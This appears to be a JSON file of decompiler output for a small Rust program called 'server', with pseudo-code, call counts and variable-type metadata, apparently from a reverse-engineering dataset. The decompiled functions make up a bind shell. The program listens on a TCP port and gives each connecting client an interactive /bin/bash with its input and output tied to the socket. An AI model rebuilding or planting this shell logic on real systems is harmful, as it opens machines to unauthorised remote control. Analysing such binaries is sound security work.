@@ -1,0 +1,169 @@
+{
+  "decompilation": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": "\n  fn server::handle_client::h0b21350cc7b22776(arg1: i32) -> i64\n\n{\n    let mut var_e0: ();\n    std::process::Command::new::h5eb91abcf33374d6(&var_e0, \"/bin/bash-isrc/main.rs192.168.0.\u2026\");\n    let mut var_100: ();\n    std::process::Command::spawn::h5a66dce7a1b6416a(&var_100, \n        std::process::Command::stderr::h778f9adf69fa6ef6(\n            std::process::Command::stdout::h3421f856f44c7056(\n                std::process::Command::stdin::he98e54bf20c0f4f0(\n                    std::process::Command::arg::h92aa95d0ce24437c(&var_e0, \n                        \"-isrc/main.rs192.168.0.9:8080{in\u2026\"), \n                    3, \n                    _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)), \n                3, \n                _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)), \n            3, \n            _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)));\n    let mut var_11c: ();\n    core::result::Result$LT$T$C$E$GT$::unwrap::h3a1e058414a6c9ec(&var_11c, &var_100);\n    std::process::Child::wait::h9eaa6dd104164a58(&var_100, &var_11c);\n    core::result::Result$LT$T$C$E$GT$::unwrap::h355d22e1d7af9bcb(&var_100);\n    core::ptr::drop_in_place$LT$std..process..Child$GT$::ha239f9afbc4a57d3(&var_11c);\n    core::ptr::drop_in_place$LT$std..process..Command$GT$::h62424edbded0113a(&var_e0);\n    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::haee64bd767160edc(arg1)\n}\n",
+    "_ZN6server4main17h71f534badac070e5E": "\n  fn server::main::h71f534badac070e5() -> i64\n\n{\n    let mut var_b0: *mut *mut [i8; 0x80];\n    std::net::tcp::TcpListener::bind::h6878a6b6f0b0ddd4(&var_b0);\n    let mut fd: i32 = core::result::Result$LT$T$C$E$GT$::expect::h9fdd00db71c10f1a(&var_b0);\n    var_b0 = &data_46b688;\n    let var_a8: i64 = 1;\n    let var_a0: *const i8 = \"/rustc/3b1717c052de4a2dbdd3badb0\u2026\";\n    let mut var_98: i128 = {0};\n    std::io::stdio::_print::h64077f6090d28911(&var_b0);\n    let mut var_bc: i32 = 0;\n    let mut var_b8: *mut i32 = &fd;\n    \n    loop\n    {\n        let mut var_60: i32;\n        _$LT$std..net..tcp..Incoming$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hf6f55b5493f73e35(&var_60, &var_b8);\n        \n        if var_60 == 2\n        {\n            break;\n        }\n        \n        let mut var_c0: i32 = core::result::Result$LT$T$C$E$GT$::expect::h3dae975375e4873f(&var_60);\n        std::net::tcp::TcpStream::peer_addr::h16381829ee6ca785(&var_b0, &var_c0);\n        let mut var_50: ();\n        core::result::Result$LT$T$C$E$GT$::unwrap::h37345e45b95a9fad(&var_50, &var_b0);\n        let mut var_80: *mut c_void = &var_50;\n        let var_78_1: fn(arg1: *mut i16) -> i64 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::h08ec6da075bafa7b;\n        let var_70_1: *mut i32 = &var_bc;\n        let var_68_1: fn(arg1: *mut i32) -> u64 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$i32$GT$::fmt::h55f9e13eb244e3e4;\n        var_b0 = &data_46b6b0;\n        let var_a8_1: i64 = 3;\n        *var_98[8] = 0;\n        let var_a0_1: *mut *mut c_void = &var_80;\n        var_98 = 2;\n        std::io::stdio::_print::h64077f6090d28911(&var_b0);\n        std::thread::spawn::hd809fa612a707511(&var_b0, var_c0);\n        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::h99b68376bec15c1a(\n            &var_b0);\n        var_bc += 1;\n    }\n    \n    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::haee64bd767160edc(fd)\n}\n"
+  },
+  "function_call_counts": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {
+      "_ZN3std7process7Command3new17h5eb91abcf33374d6E": 1,
+      "_ZN3std7process7Command5spawn17h5a66dce7a1b6416aE": 1,
+      "_ZN3std7process7Command6stderr17h778f9adf69fa6ef6E": 1,
+      "_ZN3std7process7Command6stdout17h3421f856f44c7056E": 1,
+      "_ZN3std7process7Command5stdin17he98e54bf20c0f4f0E": 1,
+      "_ZN3std7process7Command3arg17h92aa95d0ce24437cE": 1,
+      "_ZN77_$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$11from_raw_fd17h40ca4af0261e0ab7E": 3,
+      "_ZN4core6result19Result$LT$T$C$E$GT$6unwrap17h3a1e058414a6c9ecE": 1,
+      "_ZN3std7process5Child4wait17h9eaa6dd104164a58E": 1,
+      "_ZN4core6result19Result$LT$T$C$E$GT$6unwrap17h355d22e1d7af9bcbE": 1,
+      "_ZN4core3ptr40drop_in_place$LT$std..process..Child$GT$17ha239f9afbc4a57d3E": 1,
+      "_ZN4core3ptr42drop_in_place$LT$std..process..Command$GT$17h62424edbded0113aE": 1,
+      "_ZN4core3ptr45drop_in_place$LT$std..net..tcp..TcpStream$GT$17haee64bd767160edcE": 1
+    },
+    "_ZN6server4main17h71f534badac070e5E": {
+      "_ZN3std3net3tcp11TcpListener4bind17h6878a6b6f0b0ddd4E": 1,
+      "_ZN4core6result19Result$LT$T$C$E$GT$6expect17h9fdd00db71c10f1aE": 1,
+      "_ZN3std2io5stdio6_print17h64077f6090d28911E": 2,
+      "_ZN82_$LT$std..net..tcp..Incoming$u20$as$u20$core..iter..traits..iterator..Iterator$GT$4next17hf6f55b5493f73e35E": 1,
+      "_ZN4core6result19Result$LT$T$C$E$GT$6expect17h3dae975375e4873fE": 1,
+      "_ZN3std3net3tcp9TcpStream9peer_addr17h16381829ee6ca785E": 1,
+      "_ZN4core6result19Result$LT$T$C$E$GT$6unwrap17h37345e45b95a9fadE": 1,
+      "_ZN3std6thread5spawn17hd809fa612a707511E": 1,
+      "_ZN4core3ptr60drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$17h99b68376bec15c1aE": 1,
+      "_ZN4core3ptr45drop_in_place$LT$std..net..tcp..TcpStream$GT$17haee64bd767160edcE": 1
+    }
+  },
+  "num_variables": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": 3,
+    "_ZN6server4main17h71f534badac070e5E": 16
+  },
+  "macro_call_counts": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {},
+    "_ZN6server4main17h71f534badac070e5E": {}
+  },
+  "variable_types": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {
+      "stack_12": [
+        [
+          "primitive",
+          -1
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          -1
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          -1
+        ]
+      ]
+    },
+    "_ZN6server4main17h71f534badac070e5E": {
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_96": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_40": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_16": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          -1
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&&array",
+          8
+        ]
+      ]
+    }
+  },
+  "mcc": {
+    "_ZN6server13handle_client17h0b21350cc7b22776E": 1,
+    "_ZN6server4main17h71f534badac070e5E": 2
+  }
+}
